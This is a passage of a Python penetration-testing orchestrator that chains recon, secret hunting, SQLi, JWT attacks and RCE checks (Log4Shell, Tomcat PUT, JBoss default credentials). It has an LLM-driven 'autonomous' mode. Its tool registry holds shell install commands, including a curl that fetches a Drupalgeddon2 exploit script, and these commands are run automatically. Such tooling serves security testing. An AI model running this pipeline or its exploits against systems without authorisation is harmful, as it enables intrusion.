#!/usr/bin/env python3
from __future__ import annotations

"""
VAPT Orchestrator v4
Chains: recon → tech-CVE → JS analysis → secret hunt → param discovery →
        API fuzz → CORS check → vuln scan → browser scan → OOB → brain analysis → VAPT reports

Usage:
    python3 hunt.py --target example.com          Focused high-yield pipeline (SQLi/RCE/CMS/CVEs)
    python3 hunt.py --target x --quick            Quick focused scan
    python3 hunt.py --target x --full             Everything (all phases)
    python3 hunt.py --target x --autonomous       Bounded autonomous hunt
    python3 hunt.py --target x --recon-only       Recon only
    python3 hunt.py --target x --scan-only        Vuln scan only
    python3 hunt.py --target x --js-scan          JS analysis + secret extraction
    python3 hunt.py --target x --param-discover   Parameter discovery (Arjun + ParamSpider)
    python3 hunt.py --target x --api-fuzz         API endpoint brute (Kiterunner)
    python3 hunt.py --target x --secret-hunt      TruffleHog + GitHound secret scan
    python3 hunt.py --target x --cors-check       CORS misconfiguration check
    python3 hunt.py --target x --exploit          CMS exploit: Drupal (nuclei templates + CVE-2018-7600 PoC) + WP
    python3 hunt.py --target x --rce-scan         RCE: Log4Shell OOB + CVE-2017-12615 Tomcat PUT + JBoss admin
    python3 hunt.py --target x --sqlmap           sqlmap on SQLi candidates
    python3 hunt.py --target x --jwt-audit        JWT audit: alg=none, crack, RS256→HS256
    python3 hunt.py --target x --browser-scan     Real-browser validation phase
    python3 hunt.py --target x --skip xss         Skip XSS inside the focused/full vuln scan
    python3 hunt.py --target x --semgrep PATH     Semgrep static analysis on source dir
    python3 hunt.py --oob-setup                   Show interactsh OOB token for blind tests
    python3 hunt.py --target x --brain-only       Brain analysis on existing data
    python3 hunt.py --no-brain --target x         Tools only, skip AI
    python3 hunt.py --triage "finding text"       7-question gate on a finding
    python3 hunt.py --brain-next --target x       Ask brain: next best action?
    python3 hunt.py --status                      Pipeline status
    python3 hunt.py --repair-tools                Auto-install missing tools
    python3 hunt.py --setup-wordlists             Download/refresh wordlists
"""

import argparse
import concurrent.futures
import json
import os
import platform
import re
import signal
import subprocess
import sys
import shutil
import threading
import ipaddress
import time
from datetime import datetime
from urllib.parse import urlsplit


# ── Target type detection (FQDN / single IP / CIDR) ──────────────────────────

def detect_target_type(target: str) -> str:
    """Return 'cidr', 'ip', or 'domain'."""
    try:
        net = ipaddress.ip_network(target, strict=False)
        return "cidr" if net.num_addresses > 1 else "ip"
    except ValueError:
        return "domain"


def expand_cidr(cidr: str, max_hosts: int = 254) -> list[str]:
    """Expand CIDR to list of host IPs (up to max_hosts)."""
    try:
        net   = ipaddress.ip_network(cidr, strict=False)
        hosts = [str(h) for h in net.hosts()]
        return hosts[:max_hosts]
    except ValueError:
        return [cidr]


# ── Brain integration ─────────────────────────────────────────────────────────
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
try:
    from brain import Brain
    _brain_import_err = None
except Exception as _brain_err:
    Brain = None
    _brain_import_err = _brain_err

_brain = None
_brain_warned = False
_RUNTIME_SESSION_IDS: dict[str, str | None] = {}


def init_brain(log_errors: bool = True):
    """Lazy-init Brain so simple commands like --help don't contact Ollama."""
    global _brain, _brain_warned, _brain_import_err

    if _brain is not None:
        return _brain
    if Brain is None:
        if log_errors and _brain_import_err and not _brain_warned:
            print(f"\033[1;33m[!] Brain not loaded: {_brain_import_err}\033[0m")
            _brain_warned = True
        return None

    try:
        _brain = Brain()
    except Exception as exc:
        _brain_import_err = exc
        if log_errors and not _brain_warned:
            print(f"\033[1;33m[!] Brain not loaded: {_brain_import_err}\033[0m")
            _brain_warned = True
        return None
    return _brain

SCRIPT_DIR   = os.path.dirname(os.path.abspath(__file__))
BASE_DIR     = SCRIPT_DIR
TARGETS_DIR  = os.path.join(BASE_DIR, "targets")
RECON_DIR    = os.path.join(BASE_DIR, "recon")
FINDINGS_DIR = os.path.join(BASE_DIR, "findings")
REPORTS_DIR  = os.path.join(BASE_DIR, "reports")
WORDLIST_DIR = os.path.join(BASE_DIR, "wordlists")
HOME         = os.path.expanduser("~")
GOBIN        = os.path.join(HOME, "go", "bin")
TOOLS_DIR    = os.path.join(HOME, "tools")
REPO_TOOLS_DIR = os.path.join(BASE_DIR, "tools")

# Timeouts (seconds)
# RECON_TIMEOUT is a baseline — hunt_target() scales it up for large targets
RECON_TIMEOUT      = 7200   # 2h default (was 1h — too short for gov.in-class targets)
RECON_TIMEOUT_MAX  = 21600  # 6h hard cap
SCAN_TIMEOUT       = 3600
CVE_HUNT_TIMEOUT   = 600
ZERO_DAY_TIMEOUT   = 900
JS_SCAN_TIMEOUT    = 1200
PARAM_TIMEOUT      = 900
API_FUZZ_TIMEOUT   = 1800
SECRET_TIMEOUT     = 600
CORS_TIMEOUT       = 600
SEMGREP_TIMEOUT    = 1200
WATCHDOG_INTERVAL  = 60
WATCHDOG_MAX_IDLE  = 5
WATCHDOG_DIAG_AT   = 3
WATCHDOG_MSF_IDLE  = 10

# Colours
GREEN   = "\033[0;32m"
RED     = "\033[0;31m"
YELLOW  = "\033[1;33m"
CYAN    = "\033[0;36m"
MAGENTA = "\033[0;35m"
BLUE    = "\033[0;34m"
BOLD    = "\033[1m"
NC      = "\033[0m"

# ── Tool registry ─────────────────────────────────────────────────────────────
# Format: (name, binary_or_path, install_hint)
TOOL_REGISTRY = [
    # ── Core recon ──────────────────────────────────────────────────────────
    ("subfinder",         "subfinder",                                  "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"),
    ("assetfinder",       "assetfinder",                                "go install github.com/tomnomnom/assetfinder@latest"),
    ("httpx",             "httpx",                                      "go install github.com/projectdiscovery/httpx/cmd/httpx@latest"),
    ("dnsx",              "dnsx",                                       "go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest"),
    ("naabu",             "naabu",                                      "go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"),
    ("cdncheck",          "cdncheck",                                   "go install github.com/projectdiscovery/cdncheck/cmd/cdncheck@latest"),
    ("nuclei",            "nuclei",                                     "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"),
    ("ffuf",              "ffuf",                                       "go install github.com/ffuf/ffuf/v2@latest"),
    ("katana",            "katana",                                     "go install github.com/projectdiscovery/katana/cmd/katana@latest"),
    ("gau",               "gau",                                        "go install github.com/lc/gau/v2/cmd/gau@latest"),
    ("waybackurls",       "waybackurls",                                "go install github.com/tomnomnom/waybackurls@latest"),
    ("anew",              "anew",                                       "go install github.com/tomnomnom/anew@latest"),
    ("amass",             "amass",                                      "go install github.com/owasp-amass/amass/v4/...@master"),
    # ── Vulnerability scanners ──────────────────────────────────────────────
    ("dalfox",            "dalfox",                                     "go install github.com/hahwul/dalfox/v2@latest"),
    ("subzy",             "subzy",                                      "go install github.com/LukaSikic/subzy@latest"),
    ("sqlmap",            "sqlmap",                                     "brew install sqlmap"),
    ("nmap",              "nmap",                                       "brew install nmap"),
    ("whatweb",           "whatweb",                                    "brew install whatweb"),
    # ── CMS auditing ────────────────────────────────────────────────────────
    ("metasploit",        "msfconsole",                                 "brew install --cask metasploit"),
    ("drupalgeddon2",     f"{REPO_TOOLS_DIR}/drupalgeddon2.py",         f'mkdir -p "{REPO_TOOLS_DIR}" && curl -sL https://raw.githubusercontent.com/pimps/CVE-2018-7600/master/drupa7-CVE-2018-7600.py -o "{REPO_TOOLS_DIR}/drupalgeddon2.py"'),
    # ── JS analysis ─────────────────────────────────────────────────────────
    ("jsluice",           f"{GOBIN}/jsluice",                          "go install github.com/BishopFox/jsluice/cmd/jsluice@latest"),
    ("trufflehog",        "trufflehog",                                 "brew install trufflehog"),
    ("secretfinder",      f"{TOOLS_DIR}/SecretFinder/SecretFinder.py", "git clone https://github.com/m4ll0k/SecretFinder.git ~/tools/SecretFinder"),
    # ── Parameter & API discovery ────────────────────────────────────────────
    ("arjun",             "arjun",                                      "pip3 install arjun"),
    ("paramspider",       "paramspider",                                "pip3 install git+https://github.com/devanshbatham/paramspider"),
    ("kiterunner",        f"{GOBIN}/kiterunner",                       "go install github.com/assetnote/kiterunner/cmd/kiterunner@latest"),
    ("feroxbuster",       "feroxbuster",                                "brew install feroxbuster"),
    # ── OOB & secret scanning ───────────────────────────────────────────────
    ("interactsh-client", f"{GOBIN}/interactsh-client",                "go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"),
    ("git-hound",         f"{GOBIN}/git-hound",                        "go install github.com/tillson/git-hound@latest"),
    ("gowitness",         "gowitness",                                  "download the official v3 binary from https://github.com/sensepost/gowitness/releases"),
    # ── Static analysis ─────────────────────────────────────────────────────
    ("semgrep",           "semgrep",                                    "pip3 install semgrep"),
    # ── Auth testing ────────────────────────────────────────────────────────
    ("jwt_tool",          f"{HOME}/jwt_tool/jwt_tool.py",               "git clone https://github.com/ticarpi/jwt_tool.git ~/jwt_tool"),
    # ── JS-rendered form extraction ──────────────────────────────────────────
    ("browser-use",       "playwright",                                 'pip install "browser-use>=0.1.40" playwright langchain-anthropic && playwright install chromium'),
    ("lightpanda",        f"{TOOLS_DIR}/lightpanda/lightpanda",          "see _install_lightpanda()"),
]

TOOL_LIST = [t[0] for t in TOOL_REGISTRY]
AUTO_INSTALL_SYSTEM_TOOLS = {
    "arjun", "feroxbuster", "metasploit", "nmap", "paramspider",
    "semgrep", "sqlmap", "trufflehog", "whatweb",
}
SKIP_ALIASES = {
    "js": "js_analysis",
    "secrets": "secret_hunt",
    "params": "param_discovery",
    "api": "api_fuzz",
    "cms": "cms_exploit",
    "rce": "rce_scan",
    "jwt": "jwt_audit",
    "cve": "cve_hunt",
    "browser": "browser_scan",
    "report": "reports",
}

DEFAULT_AUTONOMOUS_STEPS = 6
AUTONOMOUS_AI_TECHS = {
    "anythingllm", "dify", "flowise", "langchain", "langflow",
    "librechat", "mcp", "mcp sse", "n8n", "ollama", "vllm",
}
AUTONOMOUS_CMS_TECHS = {
    "drupal", "joomla", "magento", "opencart", "prestashop",
    "typo3", "wordpress",
}
AUTONOMOUS_RCE_TECHS = {
    "confluence", "glassfish", "jboss", "langflow", "log4j",
    "log4shell", "ollama", "spring", "struts", "tomcat",
    "weblogic", "websphere", "wildfly",
}
AUTONOMOUS_AUTH_TECHS = {
    "anythingllm", "auth0", "dify", "flowise", "jwt",
    "keycloak", "langflow", "librechat", "mcp", "mcp sse", "oauth",
    "okta", "n8n",
}
AUTONOMOUS_STEP_BASE_PRIORITY = {
    "rce_scan": 100,
    "cms_exploit": 96,
    "cve_hunt": 92,
    "api_fuzz": 88,
    "sqlmap": 84,
    "scan": 80,
    "jwt_audit": 64,
    "zero_day": 60,
    "param_discovery": 42,
    "secret_hunt": 36,
    "js_analysis": 32,
    "cors": 20,
}


# ── Process Watchdog ───────────────────────────────────────────────────────────
class ProcessWatchdog:
    """
    Daemon thread that watches a running subprocess + output file.

    Every `interval` seconds it checks whether the output file has grown.
    If the watched phase shows no meaningful progress for `max_stale`
    consecutive checks (default: 5 checks × 60 s = 5 minutes idle), it kills the
    process group with SIGKILL and asks Brain for a verdict.

    Usage:
        proc = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
        wd = ProcessWatchdog(proc, watch_file, phase="RECON")
        proc.wait()
        wd.stop()
    """
    def __init__(
        self,
        proc: subprocess.Popen,
        watch_file: str,
        phase: str = "PROCESS",
        interval: int = WATCHDOG_INTERVAL,
        max_stale: int = WATCHDOG_MAX_IDLE,
        diag_at: int = WATCHDOG_DIAG_AT,
        command: str = "",
        effective_path: str = "",
    ):
        self.proc        = proc
        self.watch_file  = watch_file
        self.phase       = phase
        self.interval    = interval
        self.max_stale   = max_stale
        self.command     = command
        self.effective_path = effective_path
        self._file_meta: dict = {}
        self._last_growth_at = None
        self._last_activity_at = None
        self._last_proc_signature = ""
        self._last_descendant_summary = "(not sampled yet)"
        self._last_cpu_times: dict = {}
        self._last_socket_signature = ""
        self._last_socket_summary = "(not sampled yet)"
        self.diag_at    = diag_at   # stale_count at which brain diagnoses (default 3 min)
        self.killed     = False
        self._stop_evt  = threading.Event()
        self._thread    = threading.Thread(target=self._run, daemon=True,
                                           name=f"watchdog-{phase}")
        self._thread.start()

    def stop(self) -> None:
        """Signal the watchdog to stop (call after proc.wait())."""
        self._stop_evt.set()
        self._thread.join(timeout=5)

    def _measure(self) -> int:
        """Return total bytes of all files in the watched path (recursive)."""
        try:
            if os.path.isdir(self.watch_file):
                total = 0
                for root, _, files in os.walk(self.watch_file):
                    for fname in files:
                        try:
                            total += os.path.getsize(os.path.join(root, fname))
                        except OSError:
                            pass
                return total
            return os.path.getsize(self.watch_file)
        except OSError:
            return -1

    def _rel_watch_path(self, path: str) -> str:
        base = self.watch_file if os.path.isdir(self.watch_file) else os.path.dirname(self.watch_file)
        try:
            return os.path.relpath(path, base)
        except Exception:
            return os.path.basename(path)

    def _snapshot_files(self) -> dict:
        snapshot = {}
        try:
            paths = []
            if os.path.isdir(self.watch_file):
                for root, _, files in os.walk(self.watch_file):
                    for fname in files:
                        paths.append(os.path.join(root, fname))
            else:
                paths = [self.watch_file]

            for fp in paths:
                try:
                    snapshot[fp] = {
                        "size": os.path.getsize(fp),
                        "mtime": os.path.getmtime(fp),
                    }
                except OSError:
                    pass
        except OSError:
            pass
        return snapshot

    def _detect_file_activity(self) -> tuple[bool, bool, list, list]:
        """Track strong growth and weaker file churn separately."""
        snapshot = self._snapshot_files()
        grew = False
        changed = False
        grew_files = []
        changed_files = []

        for fp, meta in snapshot.items():
            prev = self._file_meta.get(fp)
            rel = self._rel_watch_path(fp)
            if prev is None:
                changed = True
                changed_files.append(f"NEW {rel}")
                if meta["size"] > 0:
                    grew = True
                    grew_files.append(rel)
                continue

            if meta["size"] > prev["size"]:
                grew = True
                grew_files.append(rel)

            if meta["size"] != prev["size"] or meta["mtime"] > prev["mtime"] + 0.000001:
                changed = True
                changed_files.append(rel)

        for fp in self._file_meta:
            if fp not in snapshot:
                changed = True
                changed_files.append(f"REMOVED {self._rel_watch_path(fp)}")

        self._file_meta = snapshot
        now = time.time()
        if grew:
            self._last_growth_at = now
            self._last_activity_at = now
        elif changed:
            self._last_activity_at = now

        return grew, changed, grew_files[:3], changed_files[:5]

    @staticmethod
    def _parse_ps_time(value: str) -> float:
        """Parse ps time strings like MM:SS.xx, HH:MM:SS, or DD-HH:MM:SS."""
        if not value:
            return 0.0
        days = 0
        if "-" in value:
            day_str, value = value.split("-", 1)
            try:
                days = int(day_str)
            except ValueError:
                days = 0
        parts = value.split(":")
        try:
            if len(parts) == 3:
                hours = int(parts[0])
                minutes = int(parts[1])
                seconds = float(parts[2])
            elif len(parts) == 2:
                hours = 0
                minutes = int(parts[0])
                seconds = float(parts[1])
            else:
                hours = 0
                minutes = 0
                seconds = float(parts[0])
        except ValueError:
            return 0.0
        return days * 86400 + hours * 3600 + minutes * 60 + seconds

    def _socket_status(self, tracked_pids: set[int]) -> tuple[bool, bool, str]:
        """Return (active_sockets, changed, summary) for TCP sockets held by tracked pids."""
        if not tracked_pids:
            return False, False, "(no tracked pids)"
        try:
            lsof_out = subprocess.check_output(
                ["lsof", "-nP", "-a", "-p", ",".join(str(pid) for pid in sorted(tracked_pids)), "-iTCP"],
                stderr=subprocess.DEVNULL,
                text=True,
            )
        except Exception as exc:
            summary = f"(lsof failed: {exc})"
            self._last_socket_summary = summary
            return False, False, summary

        entries = []
        counts = {}
        active = False
        for idx, line in enumerate(lsof_out.splitlines()):
            if idx == 0 or not line.strip():
                continue
            state = ""
            if "(" in line and line.rstrip().endswith(")"):
                state = line.rsplit("(", 1)[-1].rstrip(")")
            if state:
                counts[state] = counts.get(state, 0) + 1
                entries.append(line.strip())
                if state in ("ESTABLISHED", "SYN_SENT", "SYN_RECV"):
                    active = True

        signature = "\n".join(entries)
        changed = bool(signature) and signature != self._last_socket_signature
        self._last_socket_signature = signature

        if counts:
            summary = ", ".join(f"{state}={counts[state]}" for state in sorted(counts))
        else:
            summary = "(no tcp sockets)"
        self._last_socket_summary = summary
        return active, changed, summary

    def _descendant_status(self) -> tuple[bool, bool, str, bool, bool, bool, str]:
        """Return process activity signals for the subprocess tree."""
        try:
            ps_out = subprocess.check_output(
                ["ps", "-axo", "pid=,ppid=,%cpu=,state=,etime=,time=,command="],
                stderr=subprocess.DEVNULL,
                text=True,
            )
        except Exception as exc:
            summary = f"(ps failed: {exc})"
            self._last_descendant_summary = summary
            return False, False, summary, False, False, False, "(ps unavailable)"

        rows = []
        for line in ps_out.splitlines():
            parts = line.strip().split(None, 6)
            if len(parts) < 7:
                continue
            try:
                rows.append({
                    "pid": int(parts[0]),
                    "ppid": int(parts[1]),
                    "cpu": float(parts[2]),
                    "state": parts[3],
                    "etime": parts[4],
                    "cputime": self._parse_ps_time(parts[5]),
                    "command": parts[6],
                })
            except ValueError:
                continue

        tracked = {self.proc.pid}
        changed = True
        while changed:
            changed = False
            for row in rows:
                if row["ppid"] in tracked and row["pid"] not in tracked:
                    tracked.add(row["pid"])
                    changed = True

        descendants = [row for row in rows if row["pid"] in tracked]
        descendants.sort(key=lambda item: (item["pid"] != self.proc.pid, item["pid"]))

        busy = False
        cpu_advanced = False
        current_cpu_times = {}
        signature_bits = []
        summary_lines = []
        for row in descendants:
            signature_bits.append(f"{row['pid']}:{row['ppid']}:{row['state']}:{row['command']}")
            summary_lines.append(
                f"  pid={row['pid']} ppid={row['ppid']} cpu={row['cpu']:.1f} "
                f"state={row['state']} etime={row['etime']} cputime={row['cputime']:.2f}s "
                f"cmd={row['command'][:120]}"
            )
            prev_cpu = self._last_cpu_times.get(row["pid"], 0.0)
            current_cpu_times[row["pid"]] = row["cputime"]
            if row["cputime"] > prev_cpu + 0.05:
                cpu_advanced = True
            if row["cpu"] >= 0.5 or row["state"] in ("R", "D", "U"):
                busy = True

        self._last_cpu_times = current_cpu_times
        signature = "\n".join(signature_bits)
        proc_changed = bool(signature) and signature != self._last_proc_signature
        self._last_proc_signature = signature
        summary = "\n".join(summary_lines) if summary_lines else "(no descendants found)"
        self._last_descendant_summary = summary
        socket_active, socket_changed, socket_summary = self._socket_status(tracked)
        return busy, proc_changed, summary, cpu_advanced, socket_active, socket_changed, socket_summary

    def _kill_proc(self) -> None:
        """Kill the entire process group so all shell children die too."""
        try:
            pgid = os.getpgid(self.proc.pid)
            os.killpg(pgid, signal.SIGKILL)
        except Exception:
            try:
                self.proc.kill()
            except Exception:
                pass
        self.killed = True

    def _run(self) -> None:
        stale_count = 0
        start_time  = time.time()

        # Seed the per-file size snapshot BEFORE the first sleep so we have
        # a clean baseline that ignores any file clears that happened at phase
        # start (e.g. `: > httpx_full.txt`).
        self._detect_file_activity()   # seeds the baseline snapshot

        # wait for the first interval before first check
        if self._stop_evt.wait(self.interval):
            return

        while not self._stop_evt.is_set():
            # If process already finished, nothing to watchdog
            if self.proc.poll() is not None:
                break

            elapsed      = int(time.time() - start_time)
            current_size = self._measure()

            grew, changed, grew_files, changed_files = self._detect_file_activity()
            busy, proc_changed, proc_summary, cpu_advanced, socket_active, socket_changed, socket_summary = self._descendant_status()

            growth_age = (
                int(time.time() - self._last_growth_at)
                if self._last_growth_at is not None else None
            )

            if grew:
                stale_count = 0
                mode = "growing"
                detail = ", ".join(grew_files) if grew_files else "new output bytes detected"
            elif busy or cpu_advanced or changed or proc_changed or socket_changed:
                stale_count = 0 if (busy or cpu_advanced or socket_changed) else max(0, stale_count - 1)
                mode = "busy"
                detail_parts = []
                if changed_files:
                    detail_parts.append("files: " + ", ".join(changed_files))
                if proc_changed:
                    detail_parts.append("child process tree changed")
                if busy:
                    detail_parts.append("process runnable / consuming CPU")
                if cpu_advanced:
                    detail_parts.append("CPU time advanced")
                if socket_changed:
                    detail_parts.append("TCP socket activity changed")
                if socket_active:
                    detail_parts.append("tcp: " + socket_summary)
                detail = "; ".join(detail_parts) if detail_parts else "background activity without file growth"
            else:
                stale_count += 1
                mode = "idle"
                detail = "no file growth, cpu progress, socket churn, or process-tree changes"
                if socket_active:
                    detail += f"; waiting on {socket_summary}"

            if _brain and _brain.enabled:
                _brain.watchdog_status(
                    self.phase, elapsed, current_size, stale_count, self.max_stale,
                    mode=mode, detail=detail, last_growth_age=growth_age
                )
            else:
                colour = MAGENTA if mode == "growing" else CYAN if mode == "busy" else YELLOW
                print(
                    f"{colour}[Watchdog/{self.phase}] {elapsed}s | mode={mode} | "
                    f"idle={stale_count}/{self.max_stale} | bytes={current_size:,} | {detail}{NC}",
                    flush=True,
                )

            # Early-warning diagnosis only when the process looks truly idle.
            if stale_count == self.diag_at and _brain and _brain.enabled:
                diag_secs = stale_count * self.interval
                if mode == "idle":
                    print(
                        f"\033[0;35m\033[1m[Watchdog/{self.phase}] "
                        f"EARLY WARNING — {diag_secs}s no output. Asking brain to diagnose...\033[0m",
                        flush=True,
                    )
                    _brain.watchdog_diagnose(
                        self.phase, self.proc.pid, diag_secs,
                        self.watch_file, current_size,
                        meta={
                            "command": self.command,
                            "effective_path": self.effective_path,
                            "descendants": proc_summary,
                            "last_growth_age": growth_age,
                            "last_activity_age": (
                                int(time.time() - self._last_activity_at)
                                if self._last_activity_at is not None else None
                            ),
                            "mode": mode,
                            "recent_files": changed_files,
                        }
                    )
                else:
                    print(
                        f"\033[0;36m[Watchdog/{self.phase}] {diag_secs}s without new bytes, "
                        f"but process still looks {mode}; delaying brain diagnosis.\033[0m",
                        flush=True,
                    )

            if stale_count >= self.max_stale:
                stale_secs = stale_count * self.interval
                print(
                    f"\033[0;31m\033[1m[Watchdog/{self.phase}] STUCK "
                    f"({stale_secs}s idle) — killing PID {self.proc.pid}\033[0m",
                    flush=True,
                )
                if _brain and _brain.enabled:
                    _brain.watchdog_kill(self.phase, self.proc.pid, stale_secs)
                self._kill_proc()
                break

            # Wait for next interval (interruptible)
            self._stop_evt.wait(self.interval)


def log(level: str, msg: str) -> None:
    colours = {"ok": GREEN, "err": RED, "warn": YELLOW, "info": CYAN, "crit": MAGENTA, "phase": BLUE}
    symbols = {"ok": "+", "err": "-", "warn": "!", "info": "*", "crit": "!!", "phase": "»"}
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"{colours.get(level, '')}{BOLD}[{ts}] [{symbols.get(level, '*')}]{NC} {msg}")


def _tool_bin(name: str) -> str:
    """Return the binary path for a tool name from TOOL_REGISTRY."""
    for t_name, t_bin, _ in TOOL_REGISTRY:
        if t_name == name:
            return t_bin
    return name


def _tool_install_hint(name: str) -> str | None:
    """Return the install hint/command for a tool name from TOOL_REGISTRY."""
    for t_name, _, t_hint in TOOL_REGISTRY:
        if t_name == name:
            return t_hint
    return None


def parse_skip_items(raw_items: list[str] | None) -> set[str]:
    """Parse repeated/comma-separated --skip values into a normalized set."""
    skips = set()
    for raw in raw_items or []:
        for part in raw.split(","):
            item = part.strip().lower().replace("-", "_")
            if not item:
                continue
            skips.add(item)
            aliased = SKIP_ALIASES.get(item)
            if aliased:
                skips.add(aliased)
    return skips


def skip_has(skips: set[str], *names: str) -> bool:
    """Return True if any normalized skip name/alias is present."""
    normalized = {SKIP_ALIASES.get(name.lower().replace("-", "_"), name.lower().replace("-", "_")) for name in names}
    return any(name in skips for name in normalized)


def _tool_env() -> dict:
    """Runtime environment with ~/go/bin preferred for Go-based tools."""
    env = os.environ.copy()
    env["PATH"] = GOBIN + os.pathsep + env.get("PATH", "")
    return env


def _gowitness_install_command() -> str | None:
    """Install gowitness v3 from the official prebuilt binaries."""
    version = "3.1.1"
    system_name = platform.system().lower()
    machine = platform.machine().lower()
    suffix = None

    if system_name == "darwin" and machine == "arm64":
        suffix = "darwin-arm64"
    elif system_name == "darwin" and machine in {"x86_64", "amd64"}:
        suffix = "darwin-amd64"
    elif system_name == "linux" and machine in {"arm64", "aarch64"}:
        suffix = "linux-arm64"
    elif system_name == "linux" and machine in {"x86_64", "amd64"}:
        suffix = "linux-amd64"

    if not suffix:
        return None

    url = f"https://github.com/sensepost/gowitness/releases/download/{version}/gowitness-{version}-{suffix}"
    target = os.path.join(GOBIN, "gowitness")
    return f'mkdir -p "{GOBIN}" && curl -fsSL "{url}" -o "{target}" && chmod +x "{target}"'


def _tool_install_command(name: str) -> str | None:
    """Resolve an executable auto-install command for a tool, if known."""
    if name == "gowitness":
        return _gowitness_install_command()

    # lightpanda uses its own binary downloader — return sentinel so the
    # caller's lightpanda-specific branch can fire.
    if name == "lightpanda":
        return "see _install_lightpanda()"

    hint = _tool_install_hint(name)
    if not hint:
        return None

    executable_prefixes = (
        "go install ",
        "pip3 install ",
        "brew install ",
        "git clone ",
        "curl ",
        "mkdir -p ",
    )
    if hint.startswith(executable_prefixes):
        return hint
    return None


def auto_repair_tools(tool_names: list[str], include_system: bool = False) -> dict[str, list[str]]:
    """
    Attempt to install missing tools using known commands.
    By default only user-space installs are attempted; brew/pip tools require opt-in.
    """
    results = {"installed": [], "failed": [], "skipped": []}
    seen = set()

    for name in tool_names:
        if name in seen:
            continue
        seen.add(name)

        binary = _tool_bin(name)
        if _which(binary):
            results["installed"].append(name)
            continue

        cmd = _tool_install_command(name)
        if not cmd:
            results["skipped"].append(name)
            continue
        if name in AUTO_INSTALL_SYSTEM_TOOLS and not include_system:
            results["skipped"].append(name)
            continue

        # lightpanda has its own downloader — bypass shell runner
        if name == "lightpanda" and cmd.startswith("see "):
            if _install_lightpanda():
                results["installed"].append(name)
            else:
                results["failed"].append(name)
            continue

        log("info", f"Auto-installing {name}...")
        try:
            proc = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                stdin=subprocess.DEVNULL,
                cwd=SCRIPT_DIR,
                env=_tool_env(),
                preexec_fn=os.setsid,
            )
            stdout, _ = proc.communicate(timeout=900)
            result = type("R", (), {"returncode": proc.returncode, "stdout": stdout or "", "stderr": ""})()
        except subprocess.TimeoutExpired:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except Exception:
                proc.kill()
            proc.wait()
            log("warn", f"Auto-install timed out for {name}")
            results["failed"].append(name)
            continue
        except Exception as exc:
            log("warn", f"Auto-install error for {name}: {exc}")
            results["failed"].append(name)
            continue

        if result.returncode == 0 and _which(binary):
            log("ok", f"{name} installed")
            results["installed"].append(name)
            continue

        err = (result.stderr or result.stdout or "").strip().splitlines()
        detail = err[-1][:180] if err else "unknown error"
        log("warn", f"{name} install failed: {detail}")
        results["failed"].append(name)

    return results


def _dir_file_count(path: str) -> int:
    if not os.path.isdir(path):
        return 0
    total = 0
    for _, _, files in os.walk(path):
        total += len(files)
    return total


def _artifact_summary(artifacts: dict[str, str] | None = None) -> str:
    if not artifacts:
        return "(no artifacts provided)"

    lines = []
    for label, path in artifacts.items():
        if os.path.isfile(path):
            lines.append(
                f"{label}: file {os.path.basename(path)} | lines={_line_count(path)} | bytes={os.path.getsize(path)}"
            )
        elif os.path.isdir(path):
            if label == "rce":
                lines.append(_rce_artifact_summary(path))
                continue
            if label == "upload":
                lines.append(_upload_artifact_summary(path))
                continue
            lines.append(f"{label}: dir {path} | files={_dir_file_count(path)}")
        else:
            lines.append(f"{label}: missing ({path})")
    return "\n".join(lines)


def _rce_artifact_summary(path: str) -> str:
    files = _dir_file_count(path)
    nuclei_hits = 0
    oob_callbacks = 0
    put_allowed_hosts: list[str] = []
    put_upload_hosts: list[str] = []
    rce_confirmed_targets: list[str] = []
    jboss_exposed_targets: list[str] = []
    jboss_default_cred_targets: list[str] = []

    def _unique_append(items: list[str], value: str) -> None:
        if value and value not in items:
            items.append(value)

    def _target_from_evidence_file(fname: str) -> str:
        fpath = os.path.join(path, fname)
        try:
            with open(fpath, errors="ignore") as handle:
                for raw in handle:
                    if raw.startswith("TARGET:"):
                        return raw.split(":", 1)[1].strip()
        except OSError:
            pass
        return fname

    nuclei_rce = os.path.join(path, "nuclei_rce.txt")
    if os.path.isfile(nuclei_rce):
        nuclei_hits += _line_count(nuclei_rce)
    nuclei_tomcat = os.path.join(path, "nuclei_tomcat_cve.txt")
    if os.path.isfile(nuclei_tomcat):
        nuclei_hits += _line_count(nuclei_tomcat)
    interactsh_log = os.path.join(path, "interactsh_log.jsonl")
    if os.path.isfile(interactsh_log):
        oob_callbacks = _line_count(interactsh_log)

    tomcat_rce = os.path.join(path, "tomcat_put_rce.txt")
    if os.path.isfile(tomcat_rce):
        current_options_host = ""
        current_put_host = ""
        try:
            with open(tomcat_rce, errors="ignore") as handle:
                for raw in handle:
                    line = raw.strip()
                    if line.startswith("## OPTIONS "):
                        current_options_host = line[len("## OPTIONS "):].rstrip("/").strip()
                        continue
                    if line.lower().startswith("allow:") and "put" in line.lower() and current_options_host:
                        _unique_append(put_allowed_hosts, current_options_host)
                        continue
                    if line.startswith("## PUT "):
                        current_put_host = line[len("## PUT "):].strip()
                        if "/" in current_put_host.rsplit("/", 1)[-1]:
                            current_put_host = current_put_host
                        continue
                    if line in {"201", "204"} and current_put_host:
                        _unique_append(put_upload_hosts, current_put_host.rsplit("/", 1)[0])
        except OSError:
            pass

    for fname in sorted(os.listdir(path)):
        if fname.startswith("RCE_CONFIRMED"):
            _unique_append(rce_confirmed_targets, _target_from_evidence_file(fname))
        elif fname.startswith("JBOSS_EXPOSED"):
            _unique_append(jboss_exposed_targets, _target_from_evidence_file(fname))
        elif fname.startswith("JBOSS_DEFAULTCREDS"):
            _unique_append(jboss_default_cred_targets, _target_from_evidence_file(fname))

    parts = [
        f"rce: dir {path} | files={files}",
        f"confirmed_rce={len(rce_confirmed_targets)}",
        f"nuclei_hits={nuclei_hits}",
        f"oob_callbacks={oob_callbacks}",
        f"put_allowed={len(put_allowed_hosts)}",
        f"put_uploads={len(put_upload_hosts)}",
        f"jboss_exposed={len(jboss_exposed_targets)}",
        f"jboss_default_creds={len(jboss_default_cred_targets)}",
    ]
    lines = [" | ".join(parts)]
    if put_allowed_hosts:
